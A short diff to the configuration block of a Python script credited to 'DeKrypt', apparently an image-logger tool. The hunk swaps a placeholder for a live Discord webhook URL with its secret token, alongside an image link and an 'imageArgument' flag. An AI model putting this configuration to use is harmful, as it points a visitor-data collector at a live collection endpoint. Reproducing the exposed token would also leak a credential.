@@ -17,7 +17,7 @@ __author__ = "DeKrypt"
 # ===================== CONFIGURAÇÃO PRINCIPAL =====================
 config = {
     # -------------------- CONFIG BASE --------------------
-    "webhook": "WEBHOOK_AQUI",
+    "webhook": "https://discord.com/api/webhooks/1342206713813667992/ZrCTV80NToSOpDcxy7KXmUB6wIlwYfTsKwGoGADV91vLagXObWDzp9csNQbmCmAUe04G",
     "image": "https://i.imgur.com/3kl7JMQ.png",
     "imageArgument": True,
 
